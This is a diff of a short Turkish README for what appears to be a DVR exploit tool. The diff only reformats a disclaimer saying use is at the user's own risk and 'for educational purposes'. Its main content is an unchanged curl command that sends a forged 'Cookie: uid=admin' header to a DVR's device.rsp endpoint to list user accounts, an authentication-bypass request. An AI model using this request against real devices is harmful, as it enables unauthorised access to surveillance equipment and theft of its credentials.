@@ -1,9 +1,9 @@
 
 ### Çalıştırma Mantıgı:
-Öncelikle merhabalar
-Kullanım sorumlulugu tarafınıza aittir.
-herhangi bir yasal sorumluluk kabul edilmemektedir.
-eğitim amaclıdır.
+## Öncelikle merhabalar#
+## Kullanım sorumlulugu tarafınıza aittir.
+## herhangi bir yasal sorumluluk kabul edilmemektedir.
+## eğitim amaclıdır.
 ```
 	$> curl "http://<dvr_host>:<port>/device.rsp?opt=user&cmd=list" -H "Cookie: uid=admin"
 
